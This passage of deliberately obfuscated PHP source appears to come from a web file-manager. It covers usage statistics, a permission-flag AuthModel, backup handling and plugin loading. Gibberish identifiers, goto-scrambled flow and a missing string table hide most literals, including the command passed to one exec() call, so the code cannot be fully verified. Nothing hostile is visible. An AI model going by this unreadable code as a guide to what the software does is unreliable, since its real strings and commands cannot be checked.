b·º‡„ŒÚ¥: if (!$E¨¯²ÕÂèÄ) { $E¨¯²ÕÂèÄ = 1; } $bìº§ŠÍ¶Æ = strtotime(date($b÷¸ê÷³–[2045])); $CŞãßï•ÑÕ = array($b÷¸ê÷³–[2066] => array($b÷¸ê÷³–[934], $bìº§ŠÍ¶Æ)); goto AÛŠ½ ÒŠ»; a¶—ŒÃ¾: } private function optionFile() { goto cÀ«¿ÆÀ†; E„šóëÂ†: $a„‹˜™„ŠÕ = Model($aøÜÛÎÆ¦[766])->where($Dê¹½ÙŠç)->sum($aøÜÛÎÆ¦[87]); $B¥¥†·›  = Model($aøÜÛÎÆ¦[766])->where($Dê¹½ÙŠç)->count($aøÜÛÎÆ¦[377]); return array($aøÜÛÎÆ¦[711] => $C°©ÌÇö², $aøÜÛÎÆ¦[2038] => $aÂŠ²×¶Œ¹, $aøÜÛÎÆ¦[2071] => $C°©ÌÇö² - $aÂŠ²×¶Œ¹, $aøÜÛÎÆ¦[2072] => (int) $a„‹˜™„ŠÕ, $aøÜÛÎÆ¦[713] => (int) $fõ£Äì¶êò, $aøÜÛÎÆ¦[2073] => (int) $B¥¥†·› ); goto e›¡øÓ»ôá; Eˆ›ëŒÄÏÊ: $aÂŠ²×¶Œ¹ = $cÉ›Ù…¶ÎÇ[$aøÜÛÎÆ¦[2038]]; $fõ£Äì¶êò = Model($aøÜÛÎÆ¦[766])->where(array($aøÜÛÎÆ¦[378] => 0))->count($aøÜÛÎÆ¦[377]); $Dê¹½ÙŠç = array($aøÜÛÎÆ¦[378] => 0, $aøÜÛÎÆ¦[197] => array($aøÜÛÎÆ¦[934], strtotime(date($aøÜÛÎÆ¦[2045])))); goto E„šóëÂ†; cÀ«¿ÆÀ†: $aøÜÛÎÆ¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cÉ›Ù…¶ÎÇ = $this->sourceSize(); $C°©ÌÇö² = $cÉ›Ù…¶ÎÇ[$aøÜÛÎÆ¦[87]]; goto Eˆ›ëŒÄÏÊ; e›¡øÓ»ôá: } private function optionAccess() { $d²·…àšª¥ =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($d²·…àšª¥[708] => $this->typeLogCnt(), $d²·…àšª¥[113] => $this->typeLogCnt($d²·…àšª¥[113]), $d²·…àšª¥[412] => $this->typeLogCnt($d²·…àšª¥[412]), $d²·…àšª¥[2074] => $this->typeLogCnt($d²·…àšª¥[2074]), $d²·…àšª¥[2075] => $this->typeLogCnt($d²·…àšª¥[2075]), $d²·…àšª¥[543] => $this->typeLogCnt($d²·…àšª¥[33], $d²·…àšª¥[2049])); } private function typeLogCnt($Bå˜ø¢±·Û = '', $f“ÑÛÛÒÎò = "\151\144") { goto aÏâÃË¾†ˆ; e†â÷Õ“Ü: return (int) $e¤˜¥ŸÉØ…; goto Dø‘‹ñÛœˆ; AÓ—íò“×š: $E­è ¤Ü = array($eˆ…ÈÍâìÀ[197] => array($eˆ…ÈÍâìÀ[934], $Aƒ—àİë¢Ÿ)); if ($Bå˜ø¢±·Û) { $E­è ¤Ü[$eˆ…ÈÍâìÀ[29]] = array($eˆ…ÈÍâìÀ[7], $c‰Á¢ˆÌÔ–[$Bå˜ø¢±·Û]); } $e¤˜¥ŸÉØ… = Model($eˆ…ÈÍâìÀ[2048])->where($E­è ¤Ü)->count($f“ÑÛÛÒÎò); goto e†â÷Õ“Ü; aÏâÃË¾†ˆ: $eˆ…ÈÍâìÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c‰Á¢ˆÌÔ– = array($eˆ…ÈÍâìÀ[113] => array($eˆ…ÈÍâìÀ[2076], $eˆ…ÈÍâìÀ[2077]), $eˆ…ÈÍâìÀ[412] => array($eˆ…ÈÍâìÀ[2078], $eˆ…ÈÍâìÀ[2079]), $eˆ…ÈÍâìÀ[2074] => array($eˆ…ÈÍâìÀ[2080], $eˆ…ÈÍâìÀ[2081]), $eˆ…ÈÍâìÀ[2075] => array($eˆ…ÈÍâìÀ[2082], $eˆ…ÈÍâìÀ[2083]), $eˆ…ÈÍâìÀ[2084] => array($eˆ…ÈÍâìÀ[2085], $eˆ…ÈÍâìÀ[2086], $eˆ…ÈÍâìÀ[2087])); $Aƒ—àİë¢Ÿ = strtotime(date($eˆ…ÈÍâìÀ[2045])); goto AÓ—íò“×š; Dø‘‹ñÛœˆ: } private function optionServer() { goto fŒ¶àŞíìÎ; EšÙÖ°ÔŒª: $bÍµÁì»°‡ = $CêÖ„«Ü¯Î[0]; $FÏ¸šÎ·Ì = $GLOBALS[$Eä¹¡ìÙè‚[6]][$Eä¹¡ìÙè‚[17]]; $DÆ¾÷«Ÿ„š = $FÏ¸šÎ·Ì[$Eä¹¡ìÙè‚[894]]; goto F²ƒ»‚¢†Ÿ; C›ªäÌ¬Š: $eì§Ş²øÌ = array($Eä¹¡ìÙè‚[757] => $Dƒ÷„ì‰ãĞ[$Eä¹¡ìÙè‚[375]]); $EÚóÌÃ = Model($Eä¹¡ìÙè‚[430])->where($eì§Ş²øÌ)->sum($Eä¹¡ìÙè‚[87]); $CêÖ„«Ü¯Î = explode($Eä¹¡ìÙè‚[50], $_SERVER[$Eä¹¡ìÙè‚[149]]); goto EšÙÖ°ÔŒª; F²ƒ»‚¢†Ÿ: if ($DÆ¾÷«Ÿ„š == $Eä¹¡ìÙè‚[737]) { $bˆŞÙ—³â× = explode($Eä¹¡ìÙè‚[1080], $FÏ¸šÎ·Ì[$Eä¹¡ìÙè‚[893]]); $DÆ¾÷«Ÿ„š = $bˆŞÙ—³â×[0]; } if ($DÆ¾÷«Ÿ„š == $Eä¹¡ìÙè‚[740] || $DÆ¾÷«Ÿ„š == $Eä¹¡ìÙè‚[741]) { $FĞ”Ë”¢ù¼ = Model()->db()->query($Eä¹¡ìÙè‚[2088]); $dƒÃ‘çš‡ç = $FĞ”Ë”¢ù¼[0] && isset($FĞ”Ë”¢ù¼[0][$Eä¹¡ìÙè‚[1345]]) ? $FĞ”Ë”¢ù¼[0][$Eä¹¡ìÙè‚[1345]] : 0; $DÆ¾÷«Ÿ„š = $Eä¹¡ìÙè‚[2089] . ($dƒÃ‘çš‡ç ? $Eä¹¡ìÙè‚[8] . $dƒÃ‘çš‡ç : $Eä¹¡ìÙè‚[33]); } $B½«ğ©‰¬Ã = $GLOBALS[$Eä¹¡ìÙè‚[6]][$Eä¹¡ìÙè‚[346]][$Eä¹¡ìÙè‚[767]]; goto dÅÌŞ¯·Ì; dÅÌŞ¯·Ì: return array($Eä¹¡ìÙè‚[2090] => $bçÅóÍÄÉ ? $bçÅóÍÄÉ[$Eä¹¡ìÙè‚[2091]] : 0, $Eä¹¡ìÙè‚[2092] => $bçÅóÍÄÉ ? $bçÅóÍÄÉ[$Eä¹¡ìÙè‚[2093]] : 0, $Eä¹¡ìÙè‚[2094] => (int) $Dƒ÷„ì‰ãĞ[$Eä¹¡ìÙè‚[2091]] * 1024 * 1024 * 1024, $Eä¹¡ìÙè‚[2095] => (int) $EÚóÌÃ, $Eä¹¡ìÙè‚[2096] => ucfirst($bÍµÁì»°‡), $Eä¹¡ìÙè‚[2097] => $Eä¹¡ìÙè‚[2098] . PHP_VERSION, $Eä¹¡ìÙè‚[2099] => phpBuild64() ? 64 : 32, $Eä¹¡ìÙè‚[707] => str_replace($Eä¹¡ìÙè‚[2100], $Eä¹¡ìÙè‚[910], $DÆ¾÷«Ÿ„š), $Eä¹¡ìÙè‚[346] => ucfirst($B½«ğ©‰¬Ã), $Eä¹¡ìÙè‚[28] => $_SERVER[$Eä¹¡ìÙè‚[2101]]); goto fé¨šŸ‘İ; fŒ¶àŞíìÎ: $Eä¹¡ìÙè‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bçÅóÍÄÉ = $this->diskDriver(); $Dƒ÷„ì‰ãĞ = KodIO::defaultDriver(); goto C›ªäÌ¬Š; fé¨šŸ‘İ: } private function diskDriver() { goto d²¡ùÓ¨ÔË; d²¡ùÓ¨ÔË: $E‘»¥›—±Â =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÕÂ¡˜»ŒŒ = $E‘»¥›—±Â[8]; $Aä¢­ãˆ–À = $GLOBALS[$E‘»¥›—±Â[6]][$E‘»¥›—±Â[2102]] == $E‘»¥›—±Â[2103]; goto EÊÂƒØ†¨¬; EÊÂƒØ†¨¬: if ($Aä¢­ãˆ–À) { $CÕÂ¡˜»ŒŒ = $E‘»¥›—±Â[2104]; if (function_exists($E‘»¥›—±Â[2105])) { exec($E‘»¥›—±Â[2106], $fõÖ–£‰Ô); $CÕÂ¡˜»ŒŒ = $fõÖ–£‰Ô[1] . $E‘»¥›—±Â[8]; } } if (!file_exists($CÕÂ¡˜»ŒŒ)) { return; } $Bî¾®İÛµã = @disk_total_space($CÕÂ¡˜»ŒŒ); goto B±Õ›‚•ÉÔ; B±Õ›‚•ÉÔ: $AÂ­Ø“ñµõ = $Bî¾®İÛµã - @disk_free_space($CÕÂ¡˜»ŒŒ); return array($E‘»¥›—±Â[2091] => $Bî¾®İÛµã, $E‘»¥›—±Â[2093] => $AÂ­Ø“ñµõ); goto f¥Ğ¸ë‡¸ï; f¥Ğ¸ë‡¸ï: } public function fileChart($C×¸·õ²ï˜) { goto dëé¼Çå§; dëé¼Çå§: $e˜¼Æ÷ßŸÜ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($C×¸·õ²ï˜[$e˜¼Æ÷ßŸÜ[1440]])) { return Model($e˜¼Æ÷ßŸÜ[766])->userFileTypeProfile($C×¸·õ²ï˜[$e˜¼Æ÷ßŸÜ[1440]]); } if (isset($C×¸·õ²ï˜[$e˜¼Æ÷ßŸÜ[2107]])) { return Model($e˜¼Æ÷ßŸÜ[766])->groupFileTypeProfile($C×¸·õ²ï˜[$e˜¼Æ÷ßŸÜ[2107]]); } goto C›ñù¿ÉİÈ; C›ñù¿ÉİÈ: $aŸç¤Õ«Ñ” = $this->sourceSize(); $C‰Œºµ¹ÅÚ = array($e˜¼Æ÷ßŸÜ[469] => 0, $e˜¼Æ÷ßŸÜ[379] => 1); $BÇÛí–È = Model($e˜¼Æ÷ßŸÜ[766])->where($C‰Œºµ¹ÅÚ)->sum($e˜¼Æ÷ßŸÜ[87]); goto BÓÓİˆä; BÓÓİˆä: $C‰Œºµ¹ÅÚ[$e˜¼Æ÷ßŸÜ[379]] = 2; $AÒ‡åÚ¨Ğš = Model($e˜¼Æ÷ßŸÜ[766])->where($C‰Œºµ¹ÅÚ)->sum($e˜¼Æ÷ßŸÜ[87]); return array($e˜¼Æ÷ßŸÜ[711] => $aŸç¤Õ«Ñ”[$e˜¼Æ÷ßŸÜ[87]], $e˜¼Æ÷ßŸÜ[2038] => $aŸç¤Õ«Ñ”[$e˜¼Æ÷ßŸÜ[2038]], $e˜¼Æ÷ßŸÜ[2039] => (int) $BÇÛí–È, $e˜¼Æ÷ßŸÜ[2040] => (int) $AÒ‡åÚ¨Ğš); goto DÀã”â°Êò; DÀã”â°Êò: } private function sourceSize() { $få†Ã =& $_SERVER[¶ªÕß‚ØÁŸ]; $D´˜ê¢ï¸ = Model($få†Ã[766])->where(array($få†Ã[378] => 0))->sum($få†Ã[87]); $C¡²šœõ§Í = Model($få†Ã[430])->sum($få†Ã[87]); if ($C¡²šœõ§Í > $D´˜ê¢ï¸) { $C¡²šœõ§Í = $D´˜ê¢ï¸; } return array($få†Ã[87] => (int) $D´˜ê¢ï¸, $få†Ã[2038] => (int) $C¡²šœõ§Í); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $CÏöÉÂê´õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f‘¸ªÏïØ = array(array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2108]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2110], $CÏöÉÂê´õ[2111] => 6, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2114]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2115], $CÏöÉÂê´õ[2111] => 1, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2116]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2117], $CÏöÉÂê´õ[2111] => 2, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2118]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2117], $CÏöÉÂê´õ[2111] => 3, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2119]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2120], $CÏöÉÂê´õ[2111] => 4, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_VIEW), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2121]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2122], $CÏöÉÂê´õ[2111] => 5, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CÏöÉÂê´õ[394] => LNG($CÏöÉÂê´õ[2123]), $CÏöÉÂê´õ[2109] => $CÏöÉÂê´õ[2124], $CÏöÉÂê´õ[2111] => 7, $CÏöÉÂê´õ[2112] => 1, $CÏöÉÂê´õ[2113] => 0)); return $f‘¸ªÏïØ; } public static function authCheck($AÇíËµ‘®, $E†„¬ã§Ò) { $AÇíËµ‘® = intval($AÇíËµ‘®); if (_get($GLOBALS, $_SERVER[¶ªÕß‚ØÁŸ][465])) { return !0; } if ($AÇíËµ‘® <= 0) { return !1; } if (($AÇíËµ‘® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AÇíËµ‘® & $E†„¬ã§Ò); } public static function authCheckShow($D’ïåâ°‰) { return self::authCheck($D’ïåâ°‰, self::AUTH_SHOW); } public static function authCheckView($F‹ïŠ•ºìœ) { return self::authCheck($F‹ïŠ•ºìœ, self::AUTH_VIEW); } public static function authCheckDownload($aåõ£µÌ¾) { return self::authCheck($aåõ£µÌ¾, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BÌ©§—Ù) { return self::authCheck($BÌ©§—Ù, self::AUTH_UPLOAD); } public static function authCheckEdit($B¸‘Àì…¼‚) { return self::authCheck($B¸‘Àì…¼‚, self::AUTH_EDIT); } public static function authCheckRemove($cœº×š…ó„) { return self::authCheck($cœº×š…ó„, self::AUTH_REMOVE); } public static function authCheckShare($D‘ÛÑŸ•ÒÍ) { return self::authCheck($D‘ÛÑŸ•ÒÍ, self::AUTH_SHARE); } public static function authCheckComment($b¬èµ¶£›Í) { return self::authCheck($b¬èµ¶£›Í, self::AUTH_COMMENT); } public static function authCheckEvent($B™°øÁœ) { return self::authCheck($B™°øÁœ, self::AUTH_EVENT); } public static function authCheckRoot($EœÕªğã) { return self::authCheck($EœÕªğã, self::AUTH_ROOT); } public static function authDisable($CÎ‹â®¼œØ, $A¥ÊõµôÂÆ) { if (intval($CÎ‹â®¼œØ) <= 0) { return 0; } return intval($CÎ‹â®¼œØ) & ~$A¥ÊõµôÂÆ; } public $optionType = "\x53\171\163\x74\x65\155\56\163\157\x75\x72\143\x65\101\x75\164\150\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\x68", "\x6c\141\142\x65\154", "\144\151\163\160\x6c\141\171", "\x73\171\x73\164\x65\155", "\163\x6f\162\x74"); public function initData() { $Fˆ±Œ·‰„¨ = $this->authDefault(); foreach ($Fˆ±Œ·‰„¨ as $Cª’ÄäÒ«³) { $this->add($Cª’ÄäÒ«³); } } public function listData($d””¦ˆïâŸ = false, $c×ù¦…¼‰ = "\163\157\162\x74", $E“Çã‡ÊÀ = false) { return parent::listData($d””¦ˆïâŸ, $c×ù¦…¼‰, $E“Çã‡ÊÀ); } public function update($C×Ù…È•¸‰, $C«£ƒË£®) { $d®‘î÷ä¥ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C·¸¹‹³Ø = parent::listData($C×Ù…È•¸‰); $e˜¦¶‚ß˜˜ = $this->findByName($C«£ƒË£®[$d®‘î÷ä¥[28]]); if (!$C·¸¹‹³Ø || $e˜¦¶‚ß˜˜ && $e˜¦¶‚ß˜˜[$d®‘î÷ä¥[375]] != $C·¸¹‹³Ø[$d®‘î÷ä¥[375]]) { return !1; } $this->filterAuth($C«£ƒË£®[$d®‘î÷ä¥[384]]); return parent::update($C×Ù…È•¸‰, $C«£ƒË£®); } public function remove($E”ªï¯¶Û“) { $bÎ¬ò£ì = parent::listData($E”ªï¯¶Û“); if (!$bÎ¬ò£ì || $bÎ¬ò£ì[$_SERVER[¶ªÕß‚ØÁŸ][1084]]) { return !1; } return parent::remove($E”ªï¯¶Û“); } public function add($Bõ¼¿á²¸¼ = array()) { goto E‚˜˜¦ºš³; CéÔô˜¨ÇĞ: return parent::insert($Bõ¼¿á²¸¼); goto aÌîŒ¡Å¥±; E‚˜˜¦ºš³: $dç¤øËÄ‹Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->findByName($Bõ¼¿á²¸¼[$dç¤øËÄ‹Ê[28]])) { return !1; } $A²“ñ„óÔ = array($dç¤øËÄ‹Ê[28] => $dç¤øËÄ‹Ê[33], $dç¤øËÄ‹Ê[384] => 1, $dç¤øËÄ‹Ê[2125] => $dç¤øËÄ‹Ê[2126], $dç¤øËÄ‹Ê[2127] => 1, $dç¤øËÄ‹Ê[1084] => 0, $dç¤øËÄ‹Ê[2128] => 0); goto B™‘Á¬èÒÜ; B™‘Á¬èÒÜ: $Bõ¼¿á²¸¼ = array_merge($A²“ñ„óÔ, $Bõ¼¿á²¸¼); $Bõ¼¿á²¸¼[$dç¤øËÄ‹Ê[2128]] = $this->getSort(); $this->filterAuth($Bõ¼¿á²¸¼[$dç¤øËÄ‹Ê[384]]); goto CéÔô˜¨ÇĞ; aÌîŒ¡Å¥±: } private function getSort() { $B¬­‘Æà¿ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fº×£”’Üº = parent::listData(); $F³Èí©ëÆá = array_to_keyvalue($Fº×£”’Üº, $B¬­‘Æà¿[33], $B¬­‘Æà¿[2128]); return empty($F³Èí©ëÆá) ? 0 : max($F³Èí©ëÆá) + 1; } private function filterAuth(&$cíÏ¨©¥Ğ) { goto Cçêâ‹‚•ê; Cçêâ‹‚•ê: if (!$cíÏ¨©¥Ğ) { return; } $bÂ»¶ÙŠ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $E‡÷ãµÌ¶  = array(); goto dæä·Ø•ö¾; dæä·Ø•ö¾: foreach ($bÂ»¶ÙŠ as $dˆÇÛïôÍ) { if ($cíÏ¨©¥Ğ & $dˆÇÛïôÍ) { $E‡÷ãµÌ¶ [] = $dˆÇÛïôÍ; } } if (in_array(self::AUTH_ROOT, $E‡÷ãµÌ¶ )) { $cíÏ¨©¥Ğ = array_sum($bÂ»¶ÙŠ); return; } $f¬ñäÉåªƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto eàœ¼‰¢öó; eàœ¼‰¢öó: foreach ($E‡÷ãµÌ¶  as $dˆÇÛïôÍ) { if (isset($f¬ñäÉåªƒ[$dˆÇÛïôÍ])) { $E‡÷ãµÌ¶  = array_merge($E‡÷ãµÌ¶ , $f¬ñäÉåªƒ[$dˆÇÛïôÍ]); } } $E‡÷ãµÌ¶ [] = self::AUTH_SHOW; $cíÏ¨©¥Ğ = array_sum(array_unique($E‡÷ãµÌ¶ )); goto EÑèÓÓñÜ; EÑèÓÓñÜ: } public function sort($b†ÄƒÔç­, $FĞÑãô±„) { return parent::update($b†ÄƒÔç­, $FĞÑãô±„); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\142\x61\143\153\x75\x70\114\151\163\164"; public $field = array("\x69\x6f", "\156\141\155\x65", "\163\164\x61\x74\x75\x73", "\143\x6f\x6e\x74\x65\156\x74", "\162\145\163\x75\x6c\164", "\164\x69\155\145\x46\162\x6f\155", "\x74\151\155\145\124\157"); public function config() { goto CÀö”˜¯˜­; CÀö”˜¯˜­: $fˆì«È×ªÍ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a£¶ªâÓÆ = Model($fˆì«È×ªÍ[1092])->get($fˆì«È×ªÍ[727]); $a£¶ªâÓÆ = json_decode($a£¶ªâÓÆ, !0); goto dàÒöÔò§ğ; f©†‡¨Û©à: if (isset($aÜÜŠ‹àî[$fˆì«È×ªÍ[200]])) { $aÜÜŠ‹àî[$fˆì«È×ªÍ[200]] = json_decode($aÜÜŠ‹àî[$fˆì«È×ªÍ[200]], !0); } if (isset($a£¶ªâÓÆ[$fˆì«È×ªÍ[200]])) { $aÜÜŠ‹àî[$fˆì«È×ªÍ[200]][$fˆì«È×ªÍ[1415]] = $a£¶ªâÓÆ[$fˆì«È×ªÍ[200]]; unset($a£¶ªâÓÆ[$fˆì«È×ªÍ[200]]); } return array_merge($aÜÜŠ‹àî, $a£¶ªâÓÆ); goto EÜË¶ˆÖÜÀ; dàÒöÔò§ğ: $a£¶ªâÓÆ = is_array($a£¶ªâÓÆ) ? $a£¶ªâÓÆ : array(); if (!isset($a£¶ªâÓÆ[$fˆì«È×ªÍ[705]])) { $a£¶ªâÓÆ[$fˆì«È×ªÍ[705]] = $fˆì«È×ªÍ[476]; } $aÜÜŠ‹àî = array(); goto FœÁğ×ñ‹°; FœÁğ×ñ‹°: Action($fˆì«È×ªÍ[2129])->taskInit(); $f—ä‚æ«œ = Model($fˆì«È×ªÍ[2130])->listData(); foreach ($f—ä‚æ«œ as $AÛ¢îÜˆº™) { if ($AÛ¢îÜˆº™[$fˆì«È×ªÍ[1084]] == $fˆì«È×ªÍ[93] && $AÛ¢îÜˆº™[$fˆì«È×ªÍ[1428]] == $fˆì«È×ªÍ[2131]) { $aÜÜŠ‹àî = $AÛ¢îÜˆº™; break; } } goto f©†‡¨Û©à; EÜË¶ˆÖÜÀ: } public function listData($c¾÷–êªÎÙ = false, $EŸŒ˜ÌÖŸ¨ = "\155\157\144\x69\x66\x79\124\x69\155\x65", $c£ÊôÅÂÔ = false) { return parent::listData($c¾÷–êªÎÙ, $EŸŒ˜ÌÖŸ¨, !0); } public function lastItem() { $eŠÁğšÂÑÅ = $this->listData(); return !empty($eŠÁğšÂÑÅ[0]) ? $eŠÁğšÂÑÅ[0] : null; } public function kill($d‚ì½ãĞ) { goto E¼¾‘ßâ¿; E¼¾‘ßâ¿: $f×Çìùå÷Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÚâ†¼ï½† = $this->listData($d‚ì½ãĞ); if (!$FÚâ†¼ï½† || empty($FÚâ†¼ï½†[$f×Çìùå÷Œ[28]])) { return !0; } goto Bˆƒ„™Ä©¦; Bˆƒ„™Ä©¦: Task::kill($f×Çìùå÷Œ[726]); Task::kill($f×Çìùå÷Œ[742]); Task::kill($f×Çìùå÷Œ[750]); goto dĞÒ¬£ ßÄ; dĞÒ¬£ ßÄ: $e¹Šøø«âŒ = $FÚâ†¼ï½†[$f×Çìùå÷Œ[28]]; $e‰‚æÙĞ±è = TEMP_FILES . $f×Çìùå÷Œ[723] . $e¹Šøø«âŒ . $f×Çìùå÷Œ[8]; IO::remove($e‰‚æÙĞ±è, !1); goto f¿ÚñÑÑˆó; f¿ÚñÑÑˆó: return $this->remove($d‚ì½ãĞ); goto EÒÁ ï‡; EÒÁ ï‡: } public function remove($fÕÀÁ®ªİŠ) { $DÔã‚ë‡âº = $this->listData($fÕÀÁ®ªİŠ); if (!$DÔã‚ë‡âº) { return !0; } return $this->backupRemove($DÔã‚ë‡âº); } private function backupRemove($d“ÈŒäÜØ‘) { $eÕ‰Ï‡É½¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::remove($d“ÈŒäÜØ‘[$eÕ‰Ï‡É½¹[375]]); $A‡¬«·’‰ã = "\173\x69\x6f\72{$d“ÈŒäÜØ‘[$eÕ‰Ï‡É½¹[704]]}\175\x2f\144\141\164\141\142\141\163\x65\57\142\141\143\x6b\x75\x70\x5f" . $d“ÈŒäÜØ‘[$eÕ‰Ï‡É½¹[28]]; IO::remove($A‡¬«·’‰ã, !1); return !0; } public function start() { goto Eê„ëŒÛÃ‘; CÔ¢è£Œ…: if (!$eã…î³Í¹Ô || $eã…î³Í¹Ô[$f…’Êƒó£Ë[1412]] != $f…’Êƒó£Ë[93]) { return !1; } $bÂ¬¹„†ôÁ = $this->process(); foreach ($bÂ¬¹„†ôÁ as $bÒè‡¶ÔêÃ) { if ($bÒè‡¶ÔêÃ) { return Task::restart($bÒè‡¶ÔêÃ[$f…’Êƒó£Ë[375]]); } } goto bø¿‡‰”™; bƒÓ™Ñ¨ò: if (!$dñöå‡…ï­->dbFile()) { return !1; } if ($eã…î³Í¹Ô[$f…’Êƒó£Ë[705]] == $f…’Êƒó£Ë[476]) { $dñöå‡…ï­->file(); } Backup::set(array($f…’Êƒó£Ë[702] => 1, $f…’Êƒó£Ë[716] => time())); goto c»¤†Ÿæˆ²; Eê„ëŒÛÃ‘: $f…’Êƒó£Ë =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($GLOBALS[$f…’Êƒó£Ë[6]][$f…’Êƒó£Ë[94]][$f…’Êƒó£Ë[2132]] != $f…’Êƒó£Ë[93]) { return !0; } $eã…î³Í¹Ô = $this->config(); goto CÔ¢è£Œ…; bø¿‡‰”™: $dñöå‡…ï­ = new Backup(); $dñöå‡…ï­->keep(); if (!$dñöå‡…ï­->db()) { return !1; } goto bƒÓ™Ñ¨ò; c»¤†Ÿæˆ²: return !0; goto fØíã±Àèë; fØíã±Àèë: } public function process() { $F©Êâ™Ãí‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($F©Êâ™Ãí‡[707] => Task::get($F©Êâ™Ãí‡[726]), $F©Êâ™Ãí‡[710] => Task::get($F©Êâ™Ãí‡[742]), $F©Êâ™Ãí‡[177] => Task::get($F©Êâ™Ãí‡[750])); } public function restore() { $AÊ­º¶’Ó =& $_SERVER[¶ªÕß‚ØÁŸ]; ActionCall($AÊ­º¶’Ó[2133], !0, 1); ActionCall($AÊ­º¶’Ó[2133], !0, 0); } } goto B×¶Ÿí«‰Ï; E…šˆÂÒÔ‰: define($_SERVER[¶ªÕß‚ØÁŸ][235], 1); define($_SERVER[¶ªÕß‚ØÁŸ][236], 2); define($_SERVER[¶ªÕß‚ØÁŸ][237], 3); goto A‘¥«±ß”Œ; C÷ç²Ìõá: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x70\154\x75\147\x69\156\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\x73\164\x61\x74\165\163", "\162\x65\x67\x69\x65\163\x74", "\143\x6f\x6e\x66\x69\x67"); public function loadList($câ»¡»˜Æ  = false) { $CæŞåç÷†Ì = array_to_keyvalue($this->listData(), $_SERVER[¶ªÕß‚ØÁŸ][28]); if ($câ»¡»˜Æ ) { return $CæŞåç÷†Ì[$câ»¡»˜Æ ]; } return $CæŞåç÷†Ì; } public function init() { $dĞ°èŸèÌ =& $_SERVER[¶ªÕß‚ØÁŸ]; Hook::trigger($dĞ°èŸèÌ[2195]); $eÍ¼¨³â = $this->loadPluginList(); foreach ($eÍ¼¨³â as $a—›íªõÙ‡ => $D¸ùÌ›ÓÖÄ) { $c…Â¸×Õ… = $this->appAllow($a—›íªõÙ‡, $D¸ùÌ›ÓÖÄ); if (!$c…Â¸×Õ…) { continue; } foreach ($D¸ùÌ›ÓÖÄ[$dĞ°èŸèÌ[2196]] as $dÖ±ãğÒ·ã => $eŒ¼³¤ÏâÚ) { Hook::bind($dÖ±ãğÒ·ã, $eŒ¼³¤ÏâÚ); } } Hook::trigger($dĞ°èŸèÌ[2197]); Hook::trigger(ACTION); } public function appAllow($b‘†»ƒ·Êì, $d˜å²·¾÷, $EÈÈåœ‘ßÜ = true) { 